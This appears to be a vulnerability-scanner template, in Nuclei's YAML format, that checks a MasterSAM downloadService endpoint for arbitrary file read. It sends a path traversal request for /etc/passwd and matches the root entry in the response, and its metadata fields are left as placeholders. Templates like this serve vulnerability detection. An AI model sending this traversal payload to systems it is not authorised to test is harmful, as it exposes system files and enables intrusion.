id: MasterSAM-downloadService-fileread
info:
  name: Template Name
  author: wangzong
  severity: high
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"